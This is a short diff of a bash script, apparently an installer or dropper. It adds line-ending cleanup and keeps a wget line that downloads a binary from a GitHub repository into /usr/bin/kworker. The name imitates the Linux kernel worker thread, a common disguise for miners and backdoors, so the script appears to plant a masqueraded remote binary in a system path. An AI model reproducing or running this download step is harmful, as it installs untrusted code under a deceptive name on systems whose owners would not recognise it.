@@ -1,7 +1,12 @@
 #!/bin/bash
 
-set -e  # 一旦出错立即退出
-set -x  # 显示执行过程，方便调试
+# 自动清理 Windows 换行符
+if [ -f "$0" ]; then
+    sed -i 's/\r//' "$0"
+fi
+
+set -e
+set -x
 
 # 下载kworker到指定路径
 wget -O /usr/bin/kworker https://raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker
